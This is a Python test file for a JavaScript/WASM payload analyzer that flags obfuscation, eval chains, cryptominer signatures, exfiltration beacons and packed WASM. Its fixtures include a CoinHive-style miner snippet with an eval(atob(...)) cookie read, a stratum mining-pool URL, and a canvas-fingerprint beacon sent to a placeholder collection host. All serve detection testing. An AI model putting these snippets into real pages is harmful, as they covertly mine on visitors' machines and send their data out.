"""SPEC-E2 件二 §F4 验收：L2 载荷确认分析器（engine/payload.py）测试。

覆盖清单：
- 七项 JS 发现项逐一正反例（obfuscated/encoded/eval/miner/wasm_loop/exfil/entropy）
- 五项 WASM 发现项逐一正反例（bad_magic/pool_section/import_bloat/packed/stripped，
  WASM 字节用 struct 级手工构造 fixture，不依赖真实 WASM 文件）
- 良性对抗夹具锁定 score ≤20（jQuery 风格、webpack 产物风格，防误报闸）
- 矿工签名夹具 score ≥60
- F3 协议：analyze_sample kind 分派 + iter_verdicts 坏行容错跳过计数
- 契约：PayloadVerdict 字段、封顶 100、哈希自洽、max_len 截断、与 behavior.py 零耦合
"""

from __future__ import annotations

import base64
import hashlib
import inspect
import json
import random

import pytest

from tishen.engine import payload
from tishen.engine.payload import (
    JS_FINDINGS,
    MINER_SIGNATURES,
    WASM_FINDINGS,
    PayloadVerdict,
    analyze_js,
    analyze_sample,
    analyze_wasm,
    iter_verdicts,
)

# ---------------------------------------------------------------------------
# WASM fixture 手工构造（struct 级：魔数 \0asm + version + section 流）
# ---------------------------------------------------------------------------


def _uleb(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def _section(sec_id: int, payload_bytes: bytes) -> bytes:
    return bytes([sec_id]) + _uleb(len(payload_bytes)) + payload_bytes


def _custom_section(name: str, extra: bytes = b"") -> bytes:
    raw = _uleb(len(name)) + name.encode() + extra
    return _section(0, raw)


def _import_section(n_funcs: int) -> bytes:
    # 每个 import：module "m" + field "f" + kind=0(func) + typeidx=0
    body = _uleb(n_funcs) + (b"\x01m\x01f\x00\x00" * n_funcs)
    return _section(2, body)


def _wasm(*sections: bytes) -> bytes:
    return payload.WASM_MAGIC + b"".join(sections)


VALID_MINIMAL_WASM = _wasm(_custom_section("name", b"\x01\x00"))


# ---------------------------------------------------------------------------
# JS 良性对抗夹具（SPEC-E2 §F2：必须 score ≤20，防误报闸）
# ---------------------------------------------------------------------------

BENIGN_JQUERY_STYLE = """
(function (global, factory) {
    "use strict";
    if (typeof module === "object" && typeof module.exports === "object") {
        module.exports = global.document
            ? factory(global, true)
            : function (w) { throw new Error("jQuery requires a window"); };
    } else {
        factory(global);
    }
}(typeof window !== "undefined" ? window : this, function (window, noGlobal) {
    var document = window.document;
    var version = "3.7.1";
    function DObject(selector, context) {
        return this.init(selector, context);
    }
    DObject.prototype = {
        jquery: version,
        constructor: DObject,
        each: function (callback) {
            var i = 0, length = this.length;
            for (; i < length; i++) {
                if (callback.call(this[i], i, this[i]) === false) { break; }
            }
            return this;
        },
        find: function (selector) {
            var ret = [], elem, tmp;
            for (var i = 0; i < this.length; i++) {
                elem = this[i];
                if (elem.nodeType === 1) {
                    tmp = elem.getElementsByTagName(selector);
                    ret = ret.concat(Array.prototype.slice.call(tmp));
                }
            }
            return ret;
        },
        on: function (types, listener) {
            return this.each(function () {
                this.addEventListener(types, listener, false);
            });
        },
        ajax: function (url, options) {
            var xhr = new XMLHttpRequest();
            xhr.open(options && options.type || "GET", url, true);
            xhr.setRequestHeader("Accept", "application/json");
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    options.success(JSON.parse(xhr.responseText));
                }
            };
            xhr.send(options && options.data || null);
        }
    };
    window.DObject = window.$ = DObject;
    return DObject;
}));
"""

BENIGN_WEBPACK_STYLE = """
/******/ (function (modules) { // webpackBootstrap
/******/     var installedModules = {};
/******/     function __webpack_require__(moduleId) {
/******/         if (installedModules[moduleId]) {
/******/             return installedModules[moduleId].exports;
/******/         }
/******/         var module = installedModules[moduleId] = {
/******/             i: moduleId, l: false, exports: {}
/******/         };
/******/         modules[moduleId].call(module.exports, module,
/******/             module.exports, __webpack_require__);
/******/         module.l = true;
/******/         return module.exports;
/******/     }
/******/     __webpack_require__.m = modules;
/******/     __webpack_require__.c = installedModules;
/******/     __webpack_require__.d = function (exports, name, getter) {
/******/         if (!__webpack_require__.o(exports, name)) {
/******/             Object.defineProperty(exports, name,
/******/                 { enumerable: true, get: getter });
/******/         }
/******/     };
/******/     __webpack_require__.r = function (exports) {
/******/         Object.defineProperty(exports, "__esModule", { value: true });
/******/     };
/******/     __webpack_require__.t = function (value, mode) {
/******/         if (mode & 1) { value = __webpack_require__(value); }
/******/         return value;
/******/     };
/******/     return __webpack_require__(__webpack_require__.s = 0);
/******/ })([
/* 0 */ (function (module, exports, __webpack_require__) {
    "use strict";
    Object.defineProperty(exports, "__esModule", { value: true });
    var greeting_1 = __webpack_require__(1);
    document.addEventListener("DOMContentLoaded", function () {
        var el = document.getElementById("app");
        if (el) { el.textContent = greeting_1.greet("world"); }
    });
}),
/* 1 */ (function (module, exports) {
    "use strict";
    Object.defineProperty(exports, "__esModule", { value: true });
    function greet(name) { return "hello, " + name; }
    exports.greet = greet;
})
/******/ ]);
"""

# 矿工签名夹具（CoinHive 风格注入脚本）：miner_signature(40) + eval_chain(25) = 65
MINER_JS_FIXTURE = """
var _miner = new CoinHive.Anonymous('SITE_KEY', {threads: 4, throttle: 0.2});
_miner.start();
var _payload = 'ZG9jdW1lbnQuY29va2ll';
setInterval(function () {
    eval(atob(_payload));
}, 30000);
"""


# ---------------------------------------------------------------------------
# 契约与常量表
# ---------------------------------------------------------------------------


def test_findings_constant_tables_match_spec():
    assert len(JS_FINDINGS) == 7
    assert JS_FINDINGS["js.obfuscated_identifiers"] == 25
    assert JS_FINDINGS["js.encoded_literals"] == 20
    assert JS_FINDINGS["js.eval_chain"] == 25
    assert JS_FINDINGS["js.miner_signature"] == 40
    assert JS_FINDINGS["js.wasm_loop_pattern"] == 20
    assert JS_FINDINGS["js.exfil_beacon"] == 15
    assert JS_FINDINGS["js.high_entropy"] == 15
    assert WASM_FINDINGS == {
        "wasm.bad_magic": 30,
        "wasm.pool_section": 40,
        "wasm.import_bloat": 20,
        "wasm.packed": 15,
        "wasm.stripped": 10,
    }
    assert len(MINER_SIGNATURES) >= 10  # SPEC-E2 §F2：签名表 ≥10 条


def test_verdict_contract_sorted_unique_hash():
    v = analyze_js("var answer = 42;")
    assert isinstance(v, PayloadVerdict)
    assert v.kind == "js"
    assert v.score == 0
    assert v.findings == []
    assert v.subject_hash == hashlib.sha256(b"var answer = 42;").hexdigest()


def test_no_coupling_with_behavior():
    # SPEC-E2 §F4：与 behavior.py 零耦合（模块不得 import engine.* 兄弟模块）
    src = inspect.getsource(payload)
    assert "engine.behavior" not in src
    assert "from tishen.engine import behavior" not in src
    assert "import behavior" not in src


# ---------------------------------------------------------------------------
# JS 发现项：逐一正反例
# ---------------------------------------------------------------------------


def test_obfuscated_identifiers_positive():
    stmts = "".join(f"var _0x{i:04x} = {i};\n" for i in range(12))
    v = analyze_js(stmts)
    assert "js.obfuscated_identifiers" in v.findings
    assert v.score >= 25


def test_obfuscated_identifiers_negative():
    code = "\n".join(
        f"function readableName{i}(input, output) {{ return input + {i}; }}"
        for i in range(10)
    )
    assert "js.obfuscated_identifiers" not in analyze_js(code).findings


def test_encoded_literals_positive():
    lits = [("A" * 64 + "B" * 8), "aGVsbG8" * 12, "deadbeef" * 16]
    code = "".join(f'var s{i} = "{lit}";\n' for i, lit in enumerate(lits))
    assert "js.encoded_literals" in analyze_js(code).findings


def test_encoded_literals_negative():
    code = 'var a = "' + "A" * 64 + '";\nvar b = "' + "B" * 64 + '";\nvar c = "short";'
    assert "js.encoded_literals" not in analyze_js(code).findings


def test_eval_chain_positive():
    assert "js.eval_chain" in analyze_js("eval(atob('aGVsbG8='));").findings
    assert "js.eval_chain" in analyze_js(
        "var f = new Function('x', 'return x'); var g = unescape('%41'); f(g);"
    ).findings


def test_eval_chain_negative():
    code = "function evaluate(node) { return node.value; }\nvar event = evaluate(doc);"
    assert "js.eval_chain" not in analyze_js(code).findings


def test_miner_signature_positive_and_fixture_score():
    assert "js.miner_signature" in analyze_js("connect('stratum+tcp://pool.example:3333');").findings
    v = analyze_js(MINER_JS_FIXTURE)
    assert "js.miner_signature" in v.findings
    assert v.score >= 60  # SPEC-E2 §F4：矿工签名夹具 ≥60


def test_miner_signature_negative():
    assert "js.miner_signature" not in analyze_js(BENIGN_JQUERY_STYLE).findings


def test_wasm_loop_pattern_positive():
    code = """
WebAssembly.instantiateStreaming(fetch('m.wasm'), {}).then(function (res) {
    var exports = res.instance.exports;
    for (var i = 0; i < 1000000; i++) { exports.hash(i); }
});
"""
    assert "js.wasm_loop_pattern" in analyze_js(code).findings


def test_wasm_loop_pattern_negative():
    code = """
WebAssembly.instantiateStreaming(fetch('game.wasm'), {}).then(function (res) {
    document.getElementById('start').onclick = function () {
        res.instance.exports.render();
    };
});
"""
    assert "js.wasm_loop_pattern" not in analyze_js(code).findings


def test_exfil_beacon_positive():
    code = """
var fp = canvas.getContext('2d').getImageData(0, 0, 16, 16).data;
navigator.sendBeacon('https://collect.example/fp', JSON.stringify({
    fp: btoa(String(fp)), ua: navigator.userAgent, scr: screen.width
}));
"""
    assert "js.exfil_beacon" in analyze_js(code).findings


def test_exfil_beacon_negative():
    code = "fetch('/api/items', {method: 'GET'}).then(function (r) { return r.json(); });"
    assert "js.exfil_beacon" not in analyze_js(code).findings


def test_high_entropy_positive_and_negative():
    rng = random.Random(42)
    blob = base64.b64encode(rng.randbytes(8192)).decode()  # ~10.9KB，熵 ~6.0
    code = 'var blob = "' + blob + '";'
    assert len(code.encode()) > 10_000
    assert "js.high_entropy" in analyze_js(code).findings

    low_entropy = "var t = `" + "hello world, this is plain text. " * 400 + "`;"
    assert len(low_entropy.encode()) > 10_000
    assert "js.high_entropy" not in analyze_js(low_entropy).findings


def test_benign_adversarial_fixtures_score_le_20():
    # SPEC-E2 §F2/F4 防误报闸：良性对抗夹具 score ≤20，锁定
    jq = analyze_js(BENIGN_JQUERY_STYLE)
    wp = analyze_js(BENIGN_WEBPACK_STYLE)
    assert jq.score <= 20, f"jQuery 风格夹具 score={jq.score} findings={jq.findings}"
    assert wp.score <= 20, f"webpack 夹具 score={wp.score} findings={wp.findings}"


def test_score_capped_at_100():
    code = MINER_JS_FIXTURE + "\n" + "\n".join(
        f'var s{i} = "{"A" * 64}{i}";' for i in range(3)
    ) + "\nWebAssembly.instantiateStreaming(fetch('m.wasm')).then(function(r){"
    code += "for (var i=0;i<1e6;i++){ r.instance.exports.hash(i); }});"
    code += "\nvar _0x0001 = 1;" * 0  # 保持确定性
    v = analyze_js(code)
    assert v.score <= 100


def test_max_len_truncation():
    long_code = "var x = 1;\n" + "A" * 100
    v = analyze_js(long_code, max_len=10)
    assert v.subject_hash == hashlib.sha256(long_code[:10].encode()).hexdigest()


# ---------------------------------------------------------------------------
# WASM 发现项：逐一正反例（struct 构造 fixture）
# ---------------------------------------------------------------------------


def test_bad_magic_positive_and_negative():
    v = analyze_wasm(b"\x00asm\x02\x00\x00\x00")          # 版本错
    assert "wasm.bad_magic" in v.findings
    v2 = analyze_wasm(b"MZ not wasm at all")
    assert "wasm.bad_magic" in v2.findings
    v3 = analyze_wasm(VALID_MINIMAL_WASM)
    assert "wasm.bad_magic" not in v3.findings


def test_pool_section_positive_and_negative():
    pool_wasm = _wasm(_custom_section("pool", b"stratum+tcp://supportxmr.com:5555"))
    v = analyze_wasm(pool_wasm)
    assert "wasm.pool_section" in v.findings
    assert v.score >= 40
    clean = analyze_wasm(_wasm(_custom_section("build", b"rustc 1.70")))
    assert "wasm.pool_section" not in clean.findings


def test_import_bloat_positive_and_negative():
    bloated = analyze_wasm(_wasm(_import_section(201), _custom_section("name")))
    assert "wasm.import_bloat" in bloated.findings
    normal = analyze_wasm(_wasm(_import_section(200), _custom_section("name")))
    assert "wasm.import_bloat" not in normal.findings  # 阈值 >200，边界 200 不命中
    tiny = analyze_wasm(_wasm(_import_section(3), _custom_section("name")))
    assert tiny.score == 0


def test_stripped_positive_and_negative():
    # import_bloat ∧ 无 name section → stripped
    stripped = analyze_wasm(_wasm(_import_section(250)))
    assert "wasm.import_bloat" in stripped.findings
    assert "wasm.stripped" in stripped.findings
    # import_bloat 但有 name section → 不记 stripped
    named = analyze_wasm(_wasm(_import_section(250), _custom_section("name", b"\x00")))
    assert "wasm.import_bloat" in named.findings
    assert "wasm.stripped" not in named.findings


def test_packed_positive_and_negative():
    rng = random.Random(7)
    packed_bytes = rng.randbytes(8192)  # 熵 ~7.99 > 7.5（魔数必坏，仍记 packed）
    v = analyze_wasm(packed_bytes)
    assert "wasm.packed" in v.findings
    flat = analyze_wasm(VALID_MINIMAL_WASM + b"\x00" * 4096)
    assert "wasm.packed" not in flat.findings


def test_truncated_section_counts_bad_magic():
    bad = payload.WASM_MAGIC + b"\x01\xff\xff\xff\xff\x0f"  # 声明超长 section
    assert "wasm.bad_magic" in analyze_wasm(bad).findings


# ---------------------------------------------------------------------------
# F3 采样协议：analyze_sample + 坏行容错
# ---------------------------------------------------------------------------


def _sample(kind: str, raw: bytes, **over) -> dict:
    s = {
        "sha256": hashlib.sha256(raw).hexdigest(),
        "kind": kind,
        "size": len(raw),
        "head_b64": base64.b64encode(raw).decode(),
        "source_url": "https://example.com/x",
        "ts": 1753852800,
    }
    s.update(over)
    return s


def test_analyze_sample_dispatches_by_kind():
    v = analyze_sample(_sample("js", MINER_JS_FIXTURE.encode()))
    assert v.kind == "js"
    assert "js.miner_signature" in v.findings
    w = analyze_sample(_sample("wasm", _wasm(_import_section(250))))
    assert w.kind == "wasm"
    assert "wasm.import_bloat" in w.findings


def test_analyze_sample_rejects_bad_input():
    with pytest.raises(ValueError):
        analyze_sample(_sample("elf", b"\x7fELF"))
    with pytest.raises(ValueError):
        analyze_sample(_sample("js", b"x", head_b64="!!!not-base64!!!"))
    with pytest.raises(ValueError):
        analyze_sample({"kind": "js"})
    with pytest.raises(ValueError):
        analyze_sample("not-a-dict")


def test_iter_verdicts_skips_bad_lines_with_count():
    good1 = json.dumps(_sample("js", MINER_JS_FIXTURE.encode()))
    good2 = json.dumps(_sample("wasm", VALID_MINIMAL_WASM))
    lines = [
        good1,
        "{bad json",                                   # 坏 JSON
        json.dumps({"kind": "wasm"}),                  # 缺 head_b64
        json.dumps({**_sample("js", b"x"), "kind": "elf"}),  # 未知 kind
        "",                                            # 空行不算坏行
        good2,
    ]
    verdicts, skipped = iter_verdicts(lines)
    assert len(verdicts) == 2
    assert skipped == 3
    assert {v.kind for v in verdicts} == {"js", "wasm"}


def test_wasm_verdict_hash_matches_content():
    blob = _wasm(_import_section(10))
    v = analyze_wasm(blob)
    assert v.subject_hash == hashlib.sha256(blob).hexdigest()
    assert v.findings == sorted(set(v.findings))
